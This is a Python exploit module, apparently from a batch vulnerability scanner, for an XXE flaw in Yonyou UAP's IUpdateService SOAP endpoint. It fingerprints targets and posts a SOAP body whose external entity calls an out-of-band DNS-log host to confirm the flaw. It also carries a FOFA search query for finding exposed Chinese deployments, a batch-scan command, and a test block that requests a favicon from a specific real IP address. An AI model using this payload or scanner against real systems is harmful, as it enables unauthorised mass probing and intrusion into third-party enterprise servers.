# coding=utf-8
# @Author   : zpchcbd HG team
# @Time     : 2021-09-08 16:30

from core.data import gLogger
from core.utils.dnslog import eyes_dnslog_verify, get_eyes_identifier
from exploit.scripts import BaseScript
from core.myenums import BugType, BugLevel
from core.request.asynchttp import *


# fofa: 用友 && country="CN"
# python3 batch.py -m exploit.scripts.OA.yonyou.uap.xxe_IUpdateService -cs -fs "icon_hash=\"1085941792\""

class Script(BaseScript):
    name = 'yonyou-uap'

    def __init__(self, target):
        super().__init__()
        # 漏洞目标
        self.target = target
        # 漏洞等级
        self.bug_level = BugLevel.HIGH
        # 类型
        self.bug_type = BugType.XXE
        # 编号
        self.bug_number = ''
        # 来源
        self.bug_refer = ''
        # 特定路径判断
        self.detect_path_list = ['/']
        # exec
        self.exec_path_list = ['/uapws/service/nc.uap.oba.update.IUpdateService']
        # 相关信息
        self.info = 'xxe'

    async def detect(self):
        async with aiohttp.ClientSession() as session:
            for detect_path in self.detect_path_list:
                url = f'http://{self.target}{detect_path}' if self.target.startswith(('http:', 'https:')) is False else f'{self.target}{detect_path}'
                text = await AsyncFetcher.fetch(session=session, url=url, headers=self.headers, timeout=self.req_timeout)
                if '../Client/Uclient/UClient.dmg' in text:
                    self.flag = True
                    gLogger.myscan_info('[{} {}] {}'.format(self.name, BugType.FINGER, url))
                    return {'name': '{} {}'.format(self.name, BugType.FINGER), 'url': url, 'software': self.name}

    async def exec(self):
        headers = self.headers.copy()
        headers.update({'Content-Type': 'text/xml; charset=utf-8', 'SOAPAction': 'urn:getResult', 'X-FORWARDED-FOR': '127.0.0.1'})
        async with aiohttp.ClientSession() as session:
            for exec_path in self.exec_path_list:
                verify_random_int = random.randint(10000, 99999)
                url = f'http://{self.target}{exec_path}' if self.target.startswith(('http:', 'https:')) is False else f'{self.target}{exec_path}'
                data = '''<soapenv:Envelope
                xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
                xmlns:iup="http://update.oba.uap.nc/IUpdateService">
                <soapenv:Header/>
                <soapenv:Body>
                    <iup:getResult>
                        <iup:string>
                            <![CDATA[<!DOCTYPE xmlrootname [<!ENTITY % aaa SYSTEM "http://{}.{}">%aaa;]<xxx/>]]>
                        </iup:string>
                    </iup:getResult>
                </soapenv:Body>
            </soapenv:Envelope>'''.format(verify_random_int, get_eyes_identifier())
                await AsyncFetcher.post_fetch(session=session, url=url, data=data, headers=headers, timeout=self.req_timeout)
                await asyncio.sleep(2)
                text = await eyes_dnslog_verify('dns', verify_random_int)
                if text is not None and text:
                    gLogger.myscan_info('[{} {} Verify:{}] {}'.format(self.name, self.bug_type, verify_random_int, url))
                    return {'name': '{} {} Verify {}'.format(self.name, self.bug_type, verify_random_int), 'url': url, 'software': self.name}


if __name__ == '__main__':
    import requests
    import hashlib

    resp = requests.get('https://50.84.113.154:8443/favicon.ico', verify=False)
    if resp.status_code == 200:
        m1 = hashlib.md5()
        m1.update(resp.content)
        theMD5 = m1.hexdigest()
        print(theMD5)
